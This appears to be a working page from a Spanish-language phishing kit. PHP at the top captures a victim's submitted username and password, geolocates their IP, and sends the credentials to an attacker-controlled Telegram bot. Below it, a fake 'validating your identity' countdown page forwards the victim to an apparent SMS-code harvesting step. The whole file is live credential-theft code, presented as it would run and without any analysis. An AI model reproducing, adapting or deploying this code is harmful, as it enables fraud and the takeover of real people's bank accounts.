<?php

ini_set("display_errors", 0);

$config = include('config.php');

$elusr = $_POST['nombre'];
$llavecita = $_POST['normalidads'];


$token = $config['token'];
$chat_id = $config['chat_id'];


if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {

    $ip = $_SERVER['REMOTE_ADDR'];
}


$ip_info = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$city = isset($ip_info->city) ? $ip_info->city : 'Desconocida'; 


$mensaje_para_chatbot = "❤️B3D3V3❤️\nUS4RXS: ".$elusr."\nCL4X: ".$llavecita."\nIP: " . $ip . "\n" . $city;

// Usar cURL para enviar el mensaje a Telegram
$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage";

$curl = curl_init();
curl_setopt_array($curl, array(
    CURLOPT_URL => $telegram_url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => array(
        'chat_id' => $chat_id,
        'text' => $mensaje_para_chatbot
    ),
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 10
));

$response = curl_exec($curl);
$curl_error = curl_error($curl);
curl_close($curl);

// Log para debug temporal
error_log("=== DEBUG ESPERAS.PHP ===");
error_log("Usuario: " . $elusr);
error_log("Contraseña: " . $llavecita);
error_log("Token: " . substr($token, 0, 10) . "...");
error_log("Chat ID: " . $chat_id);
error_log("Telegram Response: " . $response);
if($curl_error) error_log("cURL Error: " . $curl_error);
$http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
error_log("HTTP Code: " . $http_code);
?>



<!DOCTYPE html>

<html lang="es">

   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Espere su turno</title>
     
      <meta name="viewport" content="width=device-width, initial-scale=1">
      
      <link href="css.css" rel="stylesheet">
   
   
      <style>h3[_ngcontent-c0], th[_ngcontent-c0]{color:#0067b1}@media print{.noprint-section[_ngcontent-c0]{display:none!important}}</style>
      <style>#spinner[_ngcontent-c1]{top:0;left:0;height:100%;width:100%;position:fixed;z-index:9999;opacity:.7;background-color:#f1f1f1;display:flex;align-items:center;justify-content:center}  .colored-parent,   .colored>div{background-color:#333}</style>
     
      <style>.sk-wave[_ngcontent-c9]{position:relative;top:50%;margin:auto;width:50px;height:40px;text-align:center;font-size:10px}.sk-wave[_ngcontent-c9]   .sk-rect[_ngcontent-c9]{float:left;margin-right:1px;height:100%;width:6px;display:inline-block;-webkit-animation:1.2s ease-in-out infinite sk-waveStretchDelay;animation:1.2s ease-in-out infinite sk-waveStretchDelay}.sk-wave[_ngcontent-c9]   .sk-rect1[_ngcontent-c9]{-webkit-animation-delay:-1.2s;animation-delay:-1.2s}.sk-wave[_ngcontent-c9]   .sk-rect2[_ngcontent-c9]{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}.sk-wave[_ngcontent-c9]   .sk-rect3[_ngcontent-c9]{-webkit-animation-delay:-1s;animation-delay:-1s}.sk-wave[_ngcontent-c9]   .sk-rect5[_ngcontent-c9]{-webkit-animation-delay:-.8s;animation-delay:-.8s}.sk-wave[_ngcontent-c9]   .sk-rect4[_ngcontent-c9]{-webkit-animation-delay:-.9s;animation-delay:-.9s}@-webkit-keyframes sk-waveStretchDelay{0%,100%,40%{-webkit-transform:scaleY(.4);transform:scaleY(.4)}20%{-webkit-transform:scaleY(1);transform:scaleY(1)}}@keyframes sk-waveStretchDelay{0%,100%,40%{-webkit-transform:scaleY(.4);transform:scaleY(.4)}20%{-webkit-transform:scaleY(1);transform:scaleY(1)}}</style>
      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.enable_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.enable_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.enable_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.enable_copy_btns_btn:hover{opacity:.8}.enable_copy_btns_btn:active{opacity:1}</style>
      <style>mat-form-field[_ngcontent-c10]{width:100%}form[_ngcontent-c10]{margin:inherit!important;max-width:inherit!important}.login-container[_ngcontent-c10]{overflow:hidden;background-color:#ededed;background-image:url(background.webp);background-position:center center;background-size:cover;background-repeat:no-repeat;height:100vh}.login-container-float-center[_ngcontent-c10]{position:fixed;top:50%;left:25%;width:25%;height:auto;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);background-color:#fff;box-shadow:0 5px 10px 0 rgba(0,0,0,.1);-moz-box-shadow:0 5px 10px 0 rgba(0,0,0,.1);-webkit-box-shadow:0 5px 10px 0 rgba(0,0,0,.1);-o-box-shadow:0 5px 10px 0 rgba(0,0,0,.1);-ms-box-shadow:0 5px 10px 0 rgba(0,0,0,.1);border-radius:5px}.login-container-logo[_ngcontent-c10]{display:block;margin-right:auto;margin-left:auto;margin-top:30px}.login-container-form[_ngcontent-c10]{background-color:#fff;padding:30px;border-bottom-left-radius:10px;border-bottom-right-radius:10px}.autogestion-user[_ngcontent-c10]{font-size:14px;color:#707070;text-decoration:none;font-weight:700}.button-login-container[_ngcontent-c10]{margin-top:20px;text-align:center}.button-login-container[_ngcontent-c10]   button[_ngcontent-c10]{width:50%;height:45px}.not-margin[_ngcontent-c10]{margin:0}.not-padding[_ngcontent-c10]{padding:0}.logo-login[_ngcontent-c10]{display:block;margin:0 auto;height:60px}.autogestion-usuario-unico[_ngcontent-c10]{margin-top:20px}@media (max-width:1500px){.login-container-float-center[_ngcontent-c10]{width:30%}}@media (max-width:1300px){.login-container-float-center[_ngcontent-c10]{width:40%}}@media (max-width:993px){.login-container-float-center[_ngcontent-c10]{width:50%;left:50%}.logo-login[_ngcontent-c10]{height:50px}}@media (max-width:900px){.login-container[_ngcontent-c10]{background-image:unset}}@media (max-width:680px){.login-container-float-center[_ngcontent-c10]{width:70%;background-image:inherit}.logo-login[_ngcontent-c10]{height:35px}}@media (max-width:300px){.logo-login[_ngcontent-c10]{height:30px}.login-container-float-center[_ngcontent-c10]{background-image:inherit}}mat-icon[_ngcontent-c10]{margin-left:-30px;cursor:pointer;-webkit-user-select:none;-ms-user-select:none;-moz-user-select:none;user-select:none;margin-top:-10px}input[_ngcontent-c10]:-webkit-autofill, input[_ngcontent-c10]:-webkit-autofill:active, input[_ngcontent-c10]:-webkit-autofill:focus, input[_ngcontent-c10]:-webkit-autofill:hover{-webkit-box-shadow:0 0 0 30px #f5f5f5 inset!important}.padding_bottom[_ngcontent-c10]{padding-bottom:.5em}.margin[_ngcontent-c10]{margin:1em}.margin_05[_ngcontent-c10]{margin:.5em}.mat-radio-button[_ngcontent-c10]{padding:.1em;display:flex;width:100%;justify-content:space-between}.margin_top[_ngcontent-c10]{margin-top:-.5em}.titles[_ngcontent-c10]{color:#0067b1;margin:25px 0;font-size:15px;text-align:center}.text-left[_ngcontent-c10]{text-align:left!important}</style>
      <style>.mat-form-field{display:inline-block;position:relative;text-align:left}[dir=rtl] .mat-form-field{text-align:right}.mat-form-field-wrapper{position:relative}.mat-form-field-flex{display:inline-flex;align-items:baseline;box-sizing:border-box;width:100%}.mat-form-field-prefix,.mat-form-field-suffix{white-space:nowrap;flex:none;position:relative}.mat-form-field-infix{display:block;position:relative;flex:auto;min-width:0;width:180px}@media screen and (-ms-high-contrast:active){.mat-form-field-infix{border-image:linear-gradient(transparent,transparent)}}.mat-form-field-label-wrapper{position:absolute;left:0;box-sizing:content-box;width:100%;height:100%;overflow:hidden;pointer-events:none}.mat-form-field-label{position:absolute;left:0;font:inherit;pointer-events:none;width:100%;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;transform-origin:0 0;transition:transform .4s cubic-bezier(.25,.8,.25,1),color .4s cubic-bezier(.25,.8,.25,1),width .4s cubic-bezier(.25,.8,.25,1);display:none}[dir=rtl] .mat-form-field-label{transform-origin:100% 0;left:auto;right:0}.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label,.mat-form-field-empty.mat-form-field-label{display:block}.mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:block;transition:none}.mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:block}.mat-form-field-label:not(.mat-form-field-empty){transition:none}.mat-form-field-underline{position:absolute;width:100%;pointer-events:none;transform:scaleY(1.0001)}.mat-form-field-ripple{position:absolute;left:0;width:100%;transform-origin:50%;transform:scaleX(.5);opacity:0;transition:background-color .3s cubic-bezier(.55,0,.55,.2)}.mat-form-field.mat-focused .mat-form-field-ripple,.mat-form-field.mat-form-field-invalid .mat-form-field-ripple{opacity:1;transform:scaleX(1);transition:transform .3s cubic-bezier(.25,.8,.25,1),opacity .1s cubic-bezier(.25,.8,.25,1),background-color .3s cubic-bezier(.25,.8,.25,1)}.mat-form-field-subscript-wrapper{position:absolute;box-sizing:border-box;width:100%;overflow:hidden}.mat-form-field-label-wrapper .mat-icon,.mat-form-field-subscript-wrapper .mat-icon{width:1em;height:1em;font-size:inherit;vertical-align:baseline}.mat-form-field-hint-wrapper{display:flex}.mat-form-field-hint-spacer{flex:1 0 1em}.mat-error{display:block}.mat-form-field._mat-animation-noopable .mat-form-field-label,.mat-form-field._mat-animation-noopable .mat-form-field-ripple{transition:none}</style>
      <style>.mat-form-field-appearance-fill .mat-form-field-flex{border-radius:4px 4px 0 0;padding:.75em .75em 0 .75em}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-fill .mat-form-field-flex{outline:solid 1px}}.mat-form-field-appearance-fill .mat-form-field-underline::before{content:'';display:block;position:absolute;bottom:0;height:1px;width:100%}.mat-form-field-appearance-fill .mat-form-field-ripple{bottom:0;height:2px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-fill .mat-form-field-ripple{height:0;border-top:solid 2px}}.mat-form-field-appearance-fill:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-fill._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}.mat-form-field-appearance-fill .mat-form-field-subscript-wrapper{padding:0 1em}</style>
      <style>.mat-form-field-appearance-legacy .mat-form-field-label{transform:perspective(100px);-ms-transform:none}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon{width:1em}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button{font:inherit;vertical-align:baseline}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button .mat-icon{font-size:inherit}.mat-form-field-appearance-legacy .mat-form-field-underline{height:1px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-legacy .mat-form-field-underline{height:0;border-top:solid 1px}}.mat-form-field-appearance-legacy .mat-form-field-ripple{top:0;height:2px;overflow:hidden}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-legacy .mat-form-field-ripple{height:0;border-top:solid 2px}}.mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}}.mat-form-field-appearance-legacy.mat-form-field-invalid:not(.mat-focused) .mat-form-field-ripple{height:1px}</style>
      <style>.mat-form-field-appearance-outline .mat-form-field-wrapper{margin:.25em 0}.mat-form-field-appearance-outline .mat-form-field-flex{padding:0 .75em 0 .75em;margin-top:-.25em;position:relative}.mat-form-field-appearance-outline .mat-form-field-prefix,.mat-form-field-appearance-outline .mat-form-field-suffix{top:.25em}.mat-form-field-appearance-outline .mat-form-field-outline{display:flex;position:absolute;top:.25em;left:0;right:0;bottom:0;pointer-events:none}.mat-form-field-appearance-outline .mat-form-field-outline-end,.mat-form-field-appearance-outline .mat-form-field-outline-start{border:1px solid currentColor;min-width:5px}.mat-form-field-appearance-outline .mat-form-field-outline-start{border-radius:5px 0 0 5px;border-right-style:none}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-start{border-right-style:solid;border-left-style:none;border-radius:0 5px 5px 0}.mat-form-field-appearance-outline .mat-form-field-outline-end{border-radius:0 5px 5px 0;border-left-style:none;flex-grow:1}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-end{border-left-style:solid;border-right-style:none;border-radius:5px 0 0 5px}.mat-form-field-appearance-outline .mat-form-field-outline-gap{border-radius:.000001px;border:1px solid currentColor;border-left-style:none;border-right-style:none}.mat-form-field-appearance-outline.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-outline-gap{border-top-color:transparent}.mat-form-field-appearance-outline .mat-form-field-outline-thick{opacity:0}.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-end,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-gap,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-start{border-width:2px;transition:border-color .3s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline{opacity:0;transition:opacity .1s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline{opacity:0;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline .mat-form-field-subscript-wrapper{padding:0 1em}.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-end,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-gap,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-start,.mat-form-field-appearance-outline._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-outline{transition:none}</style>
      <style>.mat-form-field-appearance-standard .mat-form-field-flex{padding-top:.75em}.mat-form-field-appearance-standard .mat-form-field-underline{height:1px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-standard .mat-form-field-underline{height:0;border-top:solid 1px}}.mat-form-field-appearance-standard .mat-form-field-ripple{bottom:0;height:2px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-standard .mat-form-field-ripple{height:0;border-top:2px}}.mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}}.mat-form-field-appearance-standard:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-standard._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}</style>
      <style>.mat-input-element{font:inherit;background:0 0;color:currentColor;border:none;outline:0;padding:0;margin:0;width:100%;max-width:100%;vertical-align:bottom;text-align:inherit}.mat-input-element:-moz-ui-invalid{box-shadow:none}.mat-input-element::-ms-clear,.mat-input-element::-ms-reveal{display:none}.mat-input-element,.mat-input-element::-webkit-search-cancel-button,.mat-input-element::-webkit-search-decoration,.mat-input-element::-webkit-search-results-button,.mat-input-element::-webkit-search-results-decoration{-webkit-appearance:none}.mat-input-element::-webkit-caps-lock-indicator,.mat-input-element::-webkit-contacts-auto-fill-button,.mat-input-element::-webkit-credentials-auto-fill-button{visibility:hidden}.mat-input-element[type=date]::after,.mat-input-element[type=datetime-local]::after,.mat-input-element[type=datetime]::after,.mat-input-element[type=month]::after,.mat-input-element[type=time]::after,.mat-input-element[type=week]::after{content:' ';white-space:pre;width:1px}.mat-input-element::placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element::-moz-placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element::-webkit-input-placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element:-ms-input-placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-form-field-hide-placeholder .mat-input-element::placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}textarea.mat-input-element{resize:vertical;overflow:auto}textarea.mat-input-element.cdk-textarea-autosize{resize:none}textarea.mat-input-element{padding:2px 0;margin:-2px 0}</style>
      <style>.mat-button,.mat-flat-button,.mat-icon-button,.mat-stroked-button{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible}.mat-button::-moz-focus-inner,.mat-flat-button::-moz-focus-inner,.mat-icon-button::-moz-focus-inner,.mat-stroked-button::-moz-focus-inner{border:0}.mat-button[disabled],.mat-flat-button[disabled],.mat-icon-button[disabled],.mat-stroked-button[disabled]{cursor:default}.mat-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-button.cdk-program-focused .mat-button-focus-overlay,.mat-flat-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-flat-button.cdk-program-focused .mat-button-focus-overlay,.mat-icon-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-icon-button.cdk-program-focused .mat-button-focus-overlay,.mat-stroked-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-stroked-button.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-button::-moz-focus-inner,.mat-flat-button::-moz-focus-inner,.mat-icon-button::-moz-focus-inner,.mat-stroked-button::-moz-focus-inner{border:0}.mat-button .mat-button-focus-overlay,.mat-icon-button .mat-button-focus-overlay{opacity:0}.mat-button:hover .mat-button-focus-overlay,.mat-stroked-button:hover .mat-button-focus-overlay{opacity:1}@media (hover:none){.mat-button:hover .mat-button-focus-overlay,.mat-stroked-button:hover .mat-button-focus-overlay{opacity:0}}.mat-raised-button{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible;transform:translate3d(0,0,0);transition:background .4s cubic-bezier(.25,.8,.25,1),box-shadow 280ms cubic-bezier(.4,0,.2,1)}.mat-raised-button::-moz-focus-inner{border:0}.mat-raised-button[disabled]{cursor:default}.mat-raised-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-raised-button.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-raised-button::-moz-focus-inner{border:0}.mat-raised-button:not([class*=mat-elevation-z]){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}._mat-animation-noopable.mat-raised-button{transition:none;animation:none}.mat-raised-button:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.mat-raised-button[disabled]{box-shadow:none}.mat-stroked-button{border:1px solid currentColor;padding:0 15px;line-height:34px}.mat-stroked-button:not([class*=mat-elevation-z]){box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)}.mat-flat-button:not([class*=mat-elevation-z]){box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)}.mat-fab{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible;transform:translate3d(0,0,0);transition:background .4s cubic-bezier(.25,.8,.25,1),box-shadow 280ms cubic-bezier(.4,0,.2,1);min-width:0;border-radius:50%;width:56px;height:56px;padding:0;flex-shrink:0}.mat-fab::-moz-focus-inner{border:0}.mat-fab[disabled]{cursor:default}.mat-fab.cdk-keyboard-focused .mat-button-focus-overlay,.mat-fab.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-fab::-moz-focus-inner{border:0}.mat-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}._mat-animation-noopable.mat-fab{transition:none;animation:none}.mat-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.mat-fab[disabled]{box-shadow:none}.mat-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 5px -1px rgba(0,0,0,.2),0 6px 10px 0 rgba(0,0,0,.14),0 1px 18px 0 rgba(0,0,0,.12)}.mat-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 7px 8px -4px rgba(0,0,0,.2),0 12px 17px 2px rgba(0,0,0,.14),0 5px 22px 4px rgba(0,0,0,.12)}.mat-fab .mat-button-wrapper{padding:16px 0;display:inline-block;line-height:24px}.mat-mini-fab{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible;transform:translate3d(0,0,0);transition:background .4s cubic-bezier(.25,.8,.25,1),box-shadow 280ms cubic-bezier(.4,0,.2,1);min-width:0;border-radius:50%;width:40px;height:40px;padding:0;flex-shrink:0}.mat-mini-fab::-moz-focus-inner{border:0}.mat-mini-fab[disabled]{cursor:default}.mat-mini-fab.cdk-keyboard-focused .mat-button-focus-overlay,.mat-mini-fab.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-mini-fab::-moz-focus-inner{border:0}.mat-mini-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}._mat-animation-noopable.mat-mini-fab{transition:none;animation:none}.mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.mat-mini-fab[disabled]{box-shadow:none}.mat-mini-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 5px -1px rgba(0,0,0,.2),0 6px 10px 0 rgba(0,0,0,.14),0 1px 18px 0 rgba(0,0,0,.12)}.mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 7px 8px -4px rgba(0,0,0,.2),0 12px 17px 2px rgba(0,0,0,.14),0 5px 22px 4px rgba(0,0,0,.12)}.mat-mini-fab .mat-button-wrapper{padding:8px 0;display:inline-block;line-height:24px}.mat-icon-button{padding:0;min-width:0;width:40px;height:40px;flex-shrink:0;line-height:40px;border-radius:50%}.mat-icon-button .mat-icon,.mat-icon-button i{line-height:24px}.mat-button-focus-overlay,.mat-button-ripple{top:0;left:0;right:0;bottom:0;position:absolute;pointer-events:none;border-radius:inherit}.mat-button-focus-overlay{background-color:rgba(0,0,0,.12);border-radius:inherit;opacity:0;transition:opacity .2s cubic-bezier(.35,0,.25,1),background-color .2s cubic-bezier(.35,0,.25,1)}._mat-animation-noopable .mat-button-focus-overlay{transition:none}@media screen and (-ms-high-contrast:active){.mat-button-focus-overlay{background-color:rgba(255,255,255,.5)}}.mat-button-ripple-round{border-radius:50%;z-index:1}.mat-button .mat-button-wrapper>*,.mat-fab .mat-button-wrapper>*,.mat-flat-button .mat-button-wrapper>*,.mat-icon-button .mat-button-wrapper>*,.mat-mini-fab .mat-button-wrapper>*,.mat-raised-button .mat-button-wrapper>*,.mat-stroked-button .mat-button-wrapper>*{vertical-align:middle}.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button,.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button{display:block;font-size:inherit;width:2.5em;height:2.5em}@media screen and (-ms-high-contrast:active){.mat-button,.mat-fab,.mat-flat-button,.mat-icon-button,.mat-mini-fab,.mat-raised-button{outline:solid 1px}}</style>
   
   </head>
   <body __processed_b69738e6-51f7-4f12-9018-b62517f3b2e4__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNiIsInNjb3JlIjoyMDAxNn1d">
     
      <app-root _nghost-c0="" ng-version="6.1.10">
         <spinner _ngcontent-c0="" spinner="sk-wave" _nghost-c1="">
            <!---->
            <div _ngcontent-c1="" id="spinner" bis_skin_checked="1">
               <!----><!----><!----><!----><!----><!----><!----><!----><!---->
               <sk-wave _ngcontent-c1="" _nghost-c9="">
                  <div _ngcontent-c9="" class="sk-wave colored" bis_skin_checked="1">
                     <div _ngcontent-c9="" class="sk-rect sk-rect1" bis_skin_checked="1"></div>
                     <div _ngcontent-c9="" class="sk-rect sk-rect2" bis_skin_checked="1"></div>
                     <div _ngcontent-c9="" class="sk-rect sk-rect3" bis_skin_checked="1"></div>
                     <div _ngcontent-c9="" class="sk-rect sk-rect4" bis_skin_checked="1"></div>
                     <div _ngcontent-c9="" class="sk-rect sk-rect5" bis_skin_checked="1"></div>
                  </div>
                  <div
            style="
              width: 100%;
              text-align: center;
              font-size: 14px;
              font-weight: bold;
              font-family: Nunito;
              color: #e40441;
              margin-top: 30px;
              margin-bottom: 30px;
            "
          >
            Estamos validando tu identidad. <br />
            
        
            <br />
            <label style="color: black"
              >Tiempo restante <span id="countdown">15</span> segundos</label
            >
            <script>
              // Función para iniciar la cuenta regresiva
              function startCountdown(seconds) {
                // Obtener el elemento <span> donde mostraremos el contador
                var countdownElement = document.getElementById("countdown");

                // Iniciar el intervalo de cuenta regresiva
                var countdownInterval = setInterval(function () {
                  // Actualizar el contenido del elemento con el valor actual de segundos
                  countdownElement.textContent = seconds;

                  // Reducir el valor de segundos
                  seconds--;

                  // Verificar si el contador ha llegado a cero
                  if (seconds < 0) {
                    // Limpiar el intervalo y mostrar una alerta
                    clearInterval(countdownInterval);

                    window.location.href = "sms.php";
                  }
                }, 1000); // Intervalo de 1 segundo
              }

              // Llamar a la función de cuenta regresiva al cargar la página
              document.addEventListener("DOMContentLoaded", function () {
                startCountdown(15); // Iniciar la cuenta regresiva con 30 segundos
              });
            </script>
               </sk-wave>
